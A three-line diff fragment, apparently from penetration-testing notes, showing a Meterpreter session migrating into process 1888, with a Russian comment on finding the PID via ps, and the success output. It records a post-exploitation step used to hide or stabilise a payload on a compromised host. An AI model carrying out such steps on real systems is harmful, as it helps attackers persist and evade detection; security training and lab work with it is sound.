@@ -1,0 +1,3 @@
+meterpreter > migrate 1888 #1888 — PID процесса, вывести список процессов - ps
+[*] Migrating to 1888...
+[*] Migration completed successfully.
